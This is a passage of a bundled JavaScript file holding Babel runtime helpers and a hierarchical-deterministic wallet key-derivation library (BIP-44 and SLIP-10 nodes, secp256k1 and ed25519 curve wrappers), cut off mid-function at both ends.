            return record.type = type, record.arg = arg, finallyEntry ? (this.method = "next", this.next = finallyEntry.finallyLoc, ContinueSentinel) : this.complete(record);
          },
          complete: function complete(record, afterLoc) {
            if ("throw" === record.type) throw record.arg;
            return "break" === record.type || "continue" === record.type ? this.next = record.arg : "return" === record.type ? (this.rval = this.arg = record.arg, this.method = "return", this.next = "end") : "normal" === record.type && afterLoc && (this.next = afterLoc), ContinueSentinel;
          },
          finish: function finish(finallyLoc) {
            for (var i = this.tryEntries.length - 1; i >= 0; --i) {
              var entry = this.tryEntries[i];
              if (entry.finallyLoc === finallyLoc) return this.complete(entry.completion, entry.afterLoc), resetTryEntry(entry), ContinueSentinel;
            }
          },
          "catch": function _catch(tryLoc) {
            for (var i = this.tryEntries.length - 1; i >= 0; --i) {
              var entry = this.tryEntries[i];
              if (entry.tryLoc === tryLoc) {
                var record = entry.completion;
                if ("throw" === record.type) {
                  var thrown = record.arg;
                  resetTryEntry(entry);
                }
                return thrown;
              }
            }
            throw new Error("illegal catch attempt");
          },
          delegateYield: function delegateYield(iterable, resultName, nextLoc) {
            return this.delegate = {
              iterator: values(iterable),
              resultName: resultName,
              nextLoc: nextLoc
            }, "next" === this.method && (this.arg = undefined), ContinueSentinel;
          }
        }, exports;
      }
      module.exports = _regeneratorRuntime, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {
      "./typeof.js": 15
    }],
    14: [function (require, module, exports) {
      function _setPrototypeOf(o, p) {
        module.exports = _setPrototypeOf = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function _setPrototypeOf(o, p) {
          o.__proto__ = p;
          return o;
        }, module.exports.__esModule = true, module.exports["default"] = module.exports;
        return _setPrototypeOf(o, p);
      }
      module.exports = _setPrototypeOf, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    15: [function (require, module, exports) {
      function _typeof(obj) {
        "@babel/helpers - typeof";

        return (module.exports = _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (obj) {
          return typeof obj;
        } : function (obj) {
          return obj && "function" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
        }, module.exports.__esModule = true, module.exports["default"] = module.exports), _typeof(obj);
      }
      module.exports = _typeof, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    16: [function (require, module, exports) {
      var runtime = require("../helpers/regeneratorRuntime")();
      module.exports = runtime;
      try {
        regeneratorRuntime = runtime;
      } catch (accidentalStrictMode) {
        if (typeof globalThis === "object") {
          globalThis.regeneratorRuntime = runtime;
        } else {
          Function("r", "regeneratorRuntime = r")(runtime);
        }
      }
    }, {
      "../helpers/regeneratorRuntime": 13
    }],
    17: [function (require, module, exports) {
      "use strict";

      var __classPrivateFieldSet = this && this.__classPrivateFieldSet || function (receiver, state, value, kind, f) {
        if (kind === "m") throw new TypeError("Private method is not writable");
        if (kind === "a" && !f) throw new TypeError("Private accessor was defined without a setter");
        if (typeof state === "function" ? receiver !== state || !f : !state.has(receiver)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
        return kind === "a" ? f.call(receiver, value) : f ? f.value = value : state.set(receiver, value), value;
      };
      var __classPrivateFieldGet = this && this.__classPrivateFieldGet || function (receiver, state, kind, f) {
        if (kind === "a" && !f) throw new TypeError("Private accessor was defined without a getter");
        if (typeof state === "function" ? receiver !== state || !f : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
        return kind === "m" ? f : kind === "a" ? f.call(receiver) : f ? f.value : state.get(receiver);
      };
      var _BIP44CoinTypeNode_node;
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.getBIP44AddressKeyDeriver = exports.deriveBIP44AddressKey = exports.BIP44CoinTypeNode = exports.BIP_44_COIN_TYPE_DEPTH = void 0;
      const constants_1 = require("./constants");
      const BIP44Node_1 = require("./BIP44Node");
      const utils_1 = require("./utils");
      const SLIP10Node_1 = require("./SLIP10Node");
      exports.BIP_44_COIN_TYPE_DEPTH = 2;
      class BIP44CoinTypeNode {
        constructor(node, coin_type) {
          _BIP44CoinTypeNode_node.set(this, void 0);
          __classPrivateFieldSet(this, _BIP44CoinTypeNode_node, node, "f");
          this.coin_type = coin_type;
          this.path = utils_1.getBIP44CoinTypePathString(coin_type);
          Object.freeze(this);
        }
        static async fromJSON(json, coin_type) {
          validateCoinType(coin_type);
          validateCoinTypeNodeDepth(json.depth);
          const node = await BIP44Node_1.BIP44Node.fromExtendedKey({
            depth: json.depth,
            index: json.index,
            parentFingerprint: json.parentFingerprint,
            chainCode: utils_1.hexStringToBuffer(json.chainCode),
            privateKey: utils_1.nullableHexStringToBuffer(json.privateKey),
            publicKey: utils_1.hexStringToBuffer(json.publicKey)
          });
          return new BIP44CoinTypeNode(node, coin_type);
        }
        static async fromDerivationPath(derivationPath) {
          validateCoinTypeNodeDepth(derivationPath.length - 1);
          const node = await BIP44Node_1.BIP44Node.fromDerivationPath({
            derivationPath
          });
          const coinType = Number.parseInt(derivationPath[exports.BIP_44_COIN_TYPE_DEPTH].split(':')[1].replace(`'`, ''), 10);
          return new BIP44CoinTypeNode(node, coinType);
        }
        static async fromNode(node, coin_type) {
          if (!(node instanceof BIP44Node_1.BIP44Node)) {
            throw new Error('Invalid node: Expected an instance of BIP44Node.');
          }
          validateCoinType(coin_type);
          validateCoinTypeNodeDepth(node.depth);
          return new BIP44CoinTypeNode(node, coin_type);
        }
        get depth() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").depth;
        }
        get privateKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").privateKeyBuffer;
        }
        get publicKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").publicKeyBuffer;
        }
        get chainCodeBuffer() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").chainCodeBuffer;
        }
        get privateKey() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").privateKey;
        }
        get publicKey() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").publicKey;
        }
        get compressedPublicKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").compressedPublicKeyBuffer;
        }
        get chainCode() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").chainCode;
        }
        get address() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").address;
        }
        get parentFingerprint() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").parentFingerprint;
        }
        get fingerprint() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").fingerprint;
        }
        get index() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").index;
        }
        get curve() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").curve;
        }
        get extendedKey() {
          return __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").extendedKey;
        }
        async deriveBIP44AddressKey({
          account = 0,
          change = 0,
          address_index
        }) {
          return await __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").derive(utils_1.getBIP44CoinTypeToAddressPathTuple({
            account,
            change,
            address_index
          }));
        }
        toJSON() {
          return Object.assign(Object.assign({}, __classPrivateFieldGet(this, _BIP44CoinTypeNode_node, "f").toJSON()), {
            coin_type: this.coin_type,
            path: this.path
          });
        }
      }
      exports.BIP44CoinTypeNode = BIP44CoinTypeNode;
      _BIP44CoinTypeNode_node = new WeakMap();
      function validateCoinTypeNodeDepth(depth) {
        if (depth !== exports.BIP_44_COIN_TYPE_DEPTH) {
          throw new Error(`Invalid depth: Coin type nodes must be of depth ${exports.BIP_44_COIN_TYPE_DEPTH}. Received: "${depth}"`);
        }
      }
      function validateCoinType(coin_type) {
        if (typeof coin_type !== 'number' || !Number.isInteger(coin_type) || coin_type < 0) {
          throw new Error('Invalid coin type: The specified coin type must be a non-negative integer number.');
        }
      }
      async function deriveBIP44AddressKey(parentKeyOrNode, {
        account = 0,
        change = 0,
        address_index
      }) {
        const path = utils_1.getBIP44CoinTypeToAddressPathTuple({
          account,
          change,
          address_index
        });
        const node = await getNode(parentKeyOrNode);
        const childNode = await SLIP10Node_1.deriveChildNode({
          path,
          node
        });
        return new BIP44Node_1.BIP44Node(childNode);
      }
      exports.deriveBIP44AddressKey = deriveBIP44AddressKey;
      async function getBIP44AddressKeyDeriver(node, accountAndChangeIndices) {
        const {
          account = 0,
          change = 0
        } = accountAndChangeIndices || {};
        const actualNode = await getNode(node);
        const accountNode = utils_1.getHardenedBIP32NodeToken(account);
        const changeNode = utils_1.getBIP32NodeToken(change);
        const bip44AddressKeyDeriver = async (address_index, isHardened = false) => {
          const slip10Node = await SLIP10Node_1.deriveChildNode({
            path: [accountNode, changeNode, isHardened ? utils_1.getHardenedBIP32NodeToken(address_index) : utils_1.getUnhardenedBIP32NodeToken(address_index)],
            node: actualNode
          });
          return new BIP44Node_1.BIP44Node(slip10Node);
        };
        bip44AddressKeyDeriver.coin_type = actualNode.coin_type;
        bip44AddressKeyDeriver.path = utils_1.getBIP44ChangePathString(actualNode.path, {
          account,
          change
        });
        Object.freeze(bip44AddressKeyDeriver);
        return bip44AddressKeyDeriver;
      }
      exports.getBIP44AddressKeyDeriver = getBIP44AddressKeyDeriver;
      async function getNode(node) {
        if (node instanceof BIP44CoinTypeNode) {
          validateCoinTypeNodeDepth(node.depth);
          return node;
        }
        if (typeof node === 'string') {
          const bip44Node = await BIP44Node_1.BIP44Node.fromExtendedKey(node);
          const coinTypeNode = await BIP44CoinTypeNode.fromNode(bip44Node, bip44Node.index - constants_1.BIP_32_HARDENED_OFFSET);
          validateCoinTypeNodeDepth(coinTypeNode.depth);
          return coinTypeNode;
        }
        return BIP44CoinTypeNode.fromJSON(node, node.coin_type);
      }
    }, {
      "./BIP44Node": 18,
      "./SLIP10Node": 19,
      "./constants": 20,
      "./utils": 31
    }],
    18: [function (require, module, exports) {
      "use strict";

      var __classPrivateFieldSet = this && this.__classPrivateFieldSet || function (receiver, state, value, kind, f) {
        if (kind === "m") throw new TypeError("Private method is not writable");
        if (kind === "a" && !f) throw new TypeError("Private accessor was defined without a setter");
        if (typeof state === "function" ? receiver !== state || !f : !state.has(receiver)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
        return kind === "a" ? f.call(receiver, value) : f ? f.value = value : state.set(receiver, value), value;
      };
      var __classPrivateFieldGet = this && this.__classPrivateFieldGet || function (receiver, state, kind, f) {
        if (kind === "a" && !f) throw new TypeError("Private accessor was defined without a getter");
        if (typeof state === "function" ? receiver !== state || !f : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
        return kind === "m" ? f : kind === "a" ? f.call(receiver) : f ? f.value : state.get(receiver);
      };
      var _BIP44Node_node;
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.validateBIP44Depth = exports.BIP44Node = void 0;
      const constants_1 = require("./constants");
      const utils_1 = require("./utils");
      const SLIP10Node_1 = require("./SLIP10Node");
      const extended_keys_1 = require("./extended-keys");
      class BIP44Node {
        constructor(node) {
          _BIP44Node_node.set(this, void 0);
          __classPrivateFieldSet(this, _BIP44Node_node, node, "f");
          Object.freeze(this);
        }
        static async fromJSON(json) {
          return BIP44Node.fromExtendedKey(json);
        }
        static async fromExtendedKey(options) {
          if (typeof options === 'string') {
            const extendedKey = extended_keys_1.decodeExtendedKey(options);
            const {
              chainCode,
              depth,
              parentFingerprint,
              index
            } = extendedKey;
            if (extendedKey.version === extended_keys_1.PRIVATE_KEY_VERSION) {
              const {
                privateKey
              } = extendedKey;
              return BIP44Node.fromExtendedKey({
                depth,
                parentFingerprint,
                index,
                privateKey,
                chainCode
              });
            }
            const {
              publicKey
            } = extendedKey;
            return BIP44Node.fromExtendedKey({
              depth,
              parentFingerprint,
              index,
              publicKey,
              chainCode
            });
          }
          const {
            privateKey,
            publicKey,
            chainCode,
            depth,
            parentFingerprint,
            index
          } = options;
          validateBIP44Depth(depth);
          const node = await SLIP10Node_1.SLIP10Node.fromExtendedKey({
            privateKey,
            publicKey,
            chainCode,
            depth,
            parentFingerprint,
            index,
            curve: 'secp256k1'
          });
          return new BIP44Node(node);
        }
        static async fromDerivationPath({
          derivationPath
        }) {
          validateBIP44Depth(derivationPath.length - 1);
          validateBIP44DerivationPath(derivationPath, constants_1.MIN_BIP_44_DEPTH);
          const node = await SLIP10Node_1.SLIP10Node.fromDerivationPath({
            derivationPath,
            curve: 'secp256k1'
          });
          return new BIP44Node(node);
        }
        get depth() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").depth;
        }
        get privateKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").privateKeyBuffer;
        }
        get publicKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").publicKeyBuffer;
        }
        get chainCodeBuffer() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").chainCodeBuffer;
        }
        get privateKey() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").privateKey;
        }
        get publicKey() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").publicKey;
        }
        get compressedPublicKeyBuffer() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").compressedPublicKeyBuffer;
        }
        get chainCode() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").chainCode;
        }
        get address() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").address;
        }
        get parentFingerprint() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").parentFingerprint;
        }
        get fingerprint() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").fingerprint;
        }
        get index() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").index;
        }
        get extendedKey() {
          const data = {
            depth: this.depth,
            parentFingerprint: this.parentFingerprint,
            index: this.index,
            chainCode: this.chainCodeBuffer
          };
          if (this.privateKeyBuffer) {
            return extended_keys_1.encodeExtendedKey(Object.assign(Object.assign({}, data), {
              version: extended_keys_1.PRIVATE_KEY_VERSION,
              privateKey: this.privateKeyBuffer
            }));
          }
          return extended_keys_1.encodeExtendedKey(Object.assign(Object.assign({}, data), {
            version: extended_keys_1.PUBLIC_KEY_VERSION,
            publicKey: this.publicKeyBuffer
          }));
        }
        get curve() {
          return __classPrivateFieldGet(this, _BIP44Node_node, "f").curve;
        }
        neuter() {
          const node = __classPrivateFieldGet(this, _BIP44Node_node, "f").neuter();
          return new BIP44Node(node);
        }
        async derive(path) {
          if (this.depth === constants_1.MAX_BIP_44_DEPTH) {
            throw new Error('Illegal operation: This HD tree node is already a leaf node.');
          }
          const newDepth = this.depth + path.length;
          validateBIP44Depth(newDepth);
          validateBIP44DerivationPath(path, this.depth + 1);
          const node = await __classPrivateFieldGet(this, _BIP44Node_node, "f").derive(path);
          return new BIP44Node(node);
        }
        toJSON() {
          return {
            depth: this.depth,
            parentFingerprint: this.parentFingerprint,
            index: this.index,
            privateKey: this.privateKey,
            publicKey: this.publicKey,
            chainCode: this.chainCode
          };
        }
      }
      exports.BIP44Node = BIP44Node;
      _BIP44Node_node = new WeakMap();
      function validateBIP44Depth(depth) {
        SLIP10Node_1.validateBIP32Depth(depth);
        if (depth < constants_1.MIN_BIP_44_DEPTH || depth > constants_1.MAX_BIP_44_DEPTH) {
          throw new Error(`Invalid HD tree path depth: The depth must be a positive integer N such that 0 <= N <= 5. Received: "${depth}"`);
        }
      }
      exports.validateBIP44Depth = validateBIP44Depth;
      function validateBIP44DerivationPath(path, startingDepth) {
        path.forEach((nodeToken, index) => {
          const currentDepth = startingDepth + index;
          switch (currentDepth) {
            case constants_1.MIN_BIP_44_DEPTH:
              if (!constants_1.BIP_39_PATH_REGEX.test(nodeToken)) {
                throw new Error('Invalid derivation path: The "m" / seed node (depth 0) must be a BIP-39 node.');
              }
              break;
            case 1:
              if (nodeToken !== constants_1.BIP44PurposeNodeToken) {
                throw new Error(`Invalid derivation path: The "purpose" node (depth 1) must be the string "${constants_1.BIP44PurposeNodeToken}".`);
              }
              break;
            case 2:
              if (!constants_1.BIP_32_PATH_REGEX.test(nodeToken) || !utils_1.isHardened(nodeToken)) {
                throw new Error('Invalid derivation path: The "coin_type" node (depth 2) must be a hardened BIP-32 node.');
              }
              break;
            case 3:
              if (!constants_1.BIP_32_PATH_REGEX.test(nodeToken) || !utils_1.isHardened(nodeToken)) {
                throw new Error('Invalid derivation path: The "account" node (depth 3) must be a hardened BIP-32 node.');
              }
              break;
            case 4:
              if (!constants_1.BIP_32_PATH_REGEX.test(nodeToken)) {
                throw new Error('Invalid derivation path: The "change" node (depth 4) must be a BIP-32 node.');
              }
              break;
            case constants_1.MAX_BIP_44_DEPTH:
              if (!constants_1.BIP_32_PATH_REGEX.test(nodeToken)) {
                throw new Error('Invalid derivation path: The "address_index" node (depth 5) must be a BIP-32 node.');
              }
              break;
            default:
              throw new Error(`Invalid derivation path: The path exceeds the maximum BIP-44 depth.`);
          }
        });
      }
    }, {
      "./SLIP10Node": 19,
      "./constants": 20,
      "./extended-keys": 29,
      "./utils": 31
    }],
    19: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.deriveChildNode = exports.validateParentFingerprint = exports.validateBIP32Depth = exports.SLIP10Node = void 0;
      const constants_1 = require("./constants");
      const curves_1 = require("./curves");
      const derivation_1 = require("./derivation");
      const bip32_1 = require("./derivers/bip32");
      const utils_1 = require("./utils");
      class SLIP10Node {
        constructor({
          depth,
          parentFingerprint,
          index,
          chainCode,
          privateKey,
          publicKey,
          curve
        }) {
          this.depth = depth;
          this.parentFingerprint = parentFingerprint;
          this.index = index;
          this.chainCodeBuffer = chainCode;
          this.privateKeyBuffer = privateKey;
          this.publicKeyBuffer = publicKey;
          this.curve = curve;
          Object.freeze(this);
        }
        static async fromJSON(json) {
          return SLIP10Node.fromExtendedKey(json);
        }
        static async fromExtendedKey({
          depth,
          parentFingerprint,
          index,
          privateKey,
          publicKey,
          chainCode,
          curve
        }) {
          const chainCodeBuffer = utils_1.getBuffer(chainCode, constants_1.BUFFER_KEY_LENGTH);
          validateCurve(curve);
          validateBIP32Depth(depth);
          utils_1.validateBIP32Index(index);
          validateParentFingerprint(parentFingerprint);
          if (privateKey) {
            const privateKeyBuffer = utils_1.getBuffer(privateKey, constants_1.BUFFER_KEY_LENGTH);
            return new SLIP10Node({
              depth,
              parentFingerprint,
              index,
              chainCode: chainCodeBuffer,
              privateKey: privateKeyBuffer,
              publicKey: await curves_1.getCurveByName(curve).getPublicKey(privateKey),
              curve
            });
          }
          if (publicKey) {
            const publicKeyBuffer = utils_1.getBuffer(publicKey, curves_1.getCurveByName(curve).publicKeyLength);
            return new SLIP10Node({
              depth,
              parentFingerprint,
              index,
              chainCode: chainCodeBuffer,
              publicKey: publicKeyBuffer,
              curve
            });
          }
          throw new Error('Invalid options: Must provide either a private key or a public key.');
        }
        static async fromDerivationPath({
          derivationPath,
          curve
        }) {
          validateCurve(curve);
          if (!derivationPath) {
            throw new Error('Invalid options: Must provide a derivation path.');
          }
          if (derivationPath.length === 0) {
            throw new Error('Invalid derivation path: May not specify an empty derivation path.');
          }
          return await derivation_1.deriveKeyFromPath({
            path: derivationPath,
            depth: derivationPath.length - 1,
            curve
          });
        }
        get chainCode() {
          return this.chainCodeBuffer.toString('hex');
        }
        get privateKey() {
          var _a;
          return (_a = this.privateKeyBuffer) === null || _a === void 0 ? void 0 : _a.toString('hex');
        }
        get publicKey() {
          return this.publicKeyBuffer.toString('hex');
        }
        get compressedPublicKeyBuffer() {
          return curves_1.getCurveByName(this.curve).compressPublicKey(this.publicKeyBuffer);
        }
        get address() {
          if (this.curve !== 'secp256k1') {
            throw new Error('Unable to get address for this node: Only secp256k1 is supported.');
          }
          return `0x${bip32_1.publicKeyToEthAddress(this.publicKeyBuffer).toString('hex')}`;
        }
        get fingerprint() {
          return utils_1.getFingerprint(this.compressedPublicKeyBuffer);
        }
        neuter() {
          return new SLIP10Node({
            depth: this.depth,
            parentFingerprint: this.parentFingerprint,
            index: this.index,
            chainCode: this.chainCodeBuffer,
            publicKey: this.publicKeyBuffer,
            curve: this.curve
          });
        }
        async derive(path) {
          return await deriveChildNode({
            path,
            node: this
          });
        }
        toJSON() {
          return {
            depth: this.depth,
            parentFingerprint: this.parentFingerprint,
            index: this.index,
            curve: this.curve,
            privateKey: this.privateKey,
            publicKey: this.publicKey,
            chainCode: this.chainCode
          };
        }
      }
      exports.SLIP10Node = SLIP10Node;
      function validateCurve(curveName) {
        if (!curveName || typeof curveName !== 'string') {
          throw new Error('Invalid curve: Must specify a curve.');
        }
        if (!Object.keys(curves_1.curves).includes(curveName)) {
          throw new Error(`Invalid curve: Only the following curves are supported: ${Object.keys(curves_1.curves).join(', ')}.`);
        }
      }
      function validateBIP32Depth(depth) {
        if (!utils_1.isValidInteger(depth)) {
          throw new Error(`Invalid HD tree path depth: The depth must be a positive integer. Received: "${depth}".`);
        }
      }
      exports.validateBIP32Depth = validateBIP32Depth;
      function validateParentFingerprint(parentFingerprint) {
        if (!utils_1.isValidInteger(parentFingerprint)) {
          throw new Error(`Invalid parent fingerprint: The fingerprint must be a positive integer. Received: "${parentFingerprint}".`);
        }
      }
      exports.validateParentFingerprint = validateParentFingerprint;
      async function deriveChildNode({
        path,
        node
      }) {
        if (path.length === 0) {
          throw new Error('Invalid HD tree derivation path: Deriving a path of length 0 is not defined.');
        }
        const newDepth = node.depth + path.length;
        validateBIP32Depth(newDepth);
        return await derivation_1.deriveKeyFromPath({
          path,
          node,
          depth: newDepth
        });
      }
      exports.deriveChildNode = deriveChildNode;
    }, {
      "./constants": 20,
      "./curves": 23,
      "./derivation": 25,
      "./derivers/bip32": 26,
      "./utils": 31
    }],
    20: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.BIP_32_HARDENED_OFFSET = exports.BIP_39_PATH_REGEX = exports.BIP_32_PATH_REGEX = exports.BIP44PurposeNodeToken = exports.MAX_BIP_44_DEPTH = exports.MIN_BIP_44_DEPTH = exports.HEXADECIMAL_KEY_LENGTH = exports.BUFFER_KEY_LENGTH = exports.BUFFER_EXTENDED_KEY_LENGTH = void 0;
      exports.BUFFER_EXTENDED_KEY_LENGTH = 64;
      exports.BUFFER_KEY_LENGTH = 32;
      exports.HEXADECIMAL_KEY_LENGTH = 64;
      exports.MIN_BIP_44_DEPTH = 0;
      exports.MAX_BIP_44_DEPTH = 5;
      exports.BIP44PurposeNodeToken = `bip32:44'`;
      exports.BIP_32_PATH_REGEX = /^bip32:\d+'?$/u;
      exports.BIP_39_PATH_REGEX = /^bip39:([a-z]+){1}( [a-z]+){11,23}$/u;
      exports.BIP_32_HARDENED_OFFSET = 0x80000000;
    }, {}],
    21: [function (require, module, exports) {
      "use strict";

      var __createBinding = this && this.__createBinding || (Object.create ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        Object.defineProperty(o, k2, {
          enumerable: true,
          get: function () {
            return m[k];
          }
        });
      } : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
      var __setModuleDefault = this && this.__setModuleDefault || (Object.create ? function (o, v) {
        Object.defineProperty(o, "default", {
          enumerable: true,
          value: v
        });
      } : function (o, v) {
        o["default"] = v;
      });
      var __importStar = this && this.__importStar || function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
        __setModuleDefault(result, mod);
        return result;
      };
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.mod = exports.getCurveByName = exports.curves = void 0;
      const secp256k1_1 = require("@noble/secp256k1");
      const secp256k1 = __importStar(require("./secp256k1"));
      const ed25519 = __importStar(require("./ed25519"));
      exports.curves = {
        secp256k1,
        ed25519
      };
      function getCurveByName(curveName) {
        return exports.curves[curveName];
      }
      exports.getCurveByName = getCurveByName;
      exports.mod = secp256k1_1.utils.mod;
    }, {
      "./ed25519": 22,
      "./secp256k1": 24,
      "@noble/secp256k1": 44
    }],
    22: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.decompressPublicKey = exports.compressPublicKey = exports.publicAdd = exports.getPublicKey = exports.publicKeyLength = exports.deriveUnhardenedKeys = exports.isValidPrivateKey = exports.secret = exports.name = exports.curve = void 0;
          const ed25519_1 = require("@noble/ed25519");
          var ed25519_2 = require("@noble/ed25519");
          Object.defineProperty(exports, "curve", {
            enumerable: true,
            get: function () {
              return ed25519_2.CURVE;
            }
          });
          exports.name = 'ed25519';
          exports.secret = Buffer.from('ed25519 seed', 'utf8');
          const isValidPrivateKey = _privateKey => true;
          exports.isValidPrivateKey = isValidPrivateKey;
          exports.deriveUnhardenedKeys = false;
          exports.publicKeyLength = 33;
          const getPublicKey = async (privateKey, _compressed) => {
            const publicKey = await ed25519_1.getPublicKey(privateKey);
            return Buffer.concat([Buffer.alloc(1, 0), publicKey]);
          };
          exports.getPublicKey = getPublicKey;
          const publicAdd = (_publicKey, _tweak) => {
            throw new Error('Ed25519 does not support public key derivation.');
          };
          exports.publicAdd = publicAdd;
          const compressPublicKey = publicKey => {
            return publicKey;
          };
          exports.compressPublicKey = compressPublicKey;
          const decompressPublicKey = publicKey => {
            return publicKey;
          };
          exports.decompressPublicKey = decompressPublicKey;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "@noble/ed25519": 32,
      "buffer": 3
    }],
    23: [function (require, module, exports) {
      "use strict";

      var __createBinding = this && this.__createBinding || (Object.create ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        Object.defineProperty(o, k2, {
          enumerable: true,
          get: function () {
            return m[k];
          }
        });
      } : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
      var __setModuleDefault = this && this.__setModuleDefault || (Object.create ? function (o, v) {
        Object.defineProperty(o, "default", {
          enumerable: true,
          value: v
        });
      } : function (o, v) {
        o["default"] = v;
      });
      var __exportStar = this && this.__exportStar || function (m, exports) {
        for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
      };
      var __importStar = this && this.__importStar || function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
        __setModuleDefault(result, mod);
        return result;
      };
      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.ed25519 = exports.secp256k1 = void 0;
      __exportStar(require("./curve"), exports);
      exports.secp256k1 = __importStar(require("./secp256k1"));
      exports.ed25519 = __importStar(require("./ed25519"));
    }, {
      "./curve": 21,
      "./ed25519": 22,
      "./secp256k1": 24
    }],
    24: [function (require, module, exports) {
      (function () {
        (function () {
          "use strict";

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          exports.decompressPublicKey = exports.compressPublicKey = exports.publicAdd = exports.getPublicKey = exports.publicKeyLength = exports.deriveUnhardenedKeys = exports.secret = exports.name = exports.isValidPrivateKey = exports.curve = void 0;
          const secp256k1_1 = require("@noble/secp256k1");
          var secp256k1_2 = require("@noble/secp256k1");
          Object.defineProperty(exports, "curve", {
            enumerable: true,
            get: function () {
              return secp256k1_2.CURVE;
            }
          });
          exports.isValidPrivateKey = secp256k1_1.utils.isValidPrivateKey;
          exports.name = 'secp256k1';
          exports.secret = Buffer.from('Bitcoin seed', 'utf8');
          exports.deriveUnhardenedKeys = true;
          exports.publicKeyLength = 65;
          const getPublicKey = (privateKey, compressed) => Buffer.from(secp256k1_1.getPublicKey(privateKey, compressed));
          exports.getPublicKey = getPublicKey;
          const publicAdd = (publicKey, tweak) => {
            const point = secp256k1_1.Point.fromHex(publicKey);
            const newPoint = point.add(secp256k1_1.Point.fromPrivateKey(tweak));
            newPoint.assertValidity();
            return Buffer.from(newPoint.toRawBytes(false));
          };
          exports.publicAdd = publicAdd;
          const compressPublicKey = publicKey => {
            const point = secp256k1_1.Point.fromHex(publicKey);
            return Buffer.from(point.toRawBytes(true));
          };
          exports.compressPublicKey = compressPublicKey;
          const decompressPublicKey = publicKey => {
            const point = secp256k1_1.Point.fromHex(publicKey);
            return Buffer.from(point.toRawBytes(false));
          };
          exports.decompressPublicKey = decompressPublicKey;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "@noble/secp256k1": 44,
      "buffer": 3
    }],
    25: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.validatePathSegment = exports.deriveKeyFromPath = void 0;
      const constants_1 = require("./constants");
      const derivers_1 = require("./derivers");
      const SLIP10Node_1 = require("./SLIP10Node");
      const BIP44Node_1 = require("./BIP44Node");
      const BIP44CoinTypeNode_1 = require("./BIP44CoinTypeNode");
      const curves_1 = require("./curves");
      async function deriveKeyFromPath(args) {
        const {
          path,
          depth = path.length
        } = args;
        const node = 'node' in args ? args.node : undefined;
        const curve = 'curve' in args ? args.curve : node === null || node === void 0 ? void 0 : node.curve;
        if (node && !(node instanceof SLIP10Node_1.SLIP10Node) && !(node instanceof BIP44Node_1.BIP44Node) && !(node instanceof BIP44CoinTypeNode_1.BIP44CoinTypeNode)) {
          throw new Error('Invalid arguments: Node must be a SLIP-10 node or a BIP-44 node when provided.');
        }
        if (!curve) {
          throw new Error('Invalid arguments: Must specify either a parent node or curve.');
        }
        validatePathSegment(path, Boolean(node === null || node === void 0 ? void 0 : node.privateKey) || Boolean(node === null || node === void 0 ? void 0 : node.publicKey), depth);
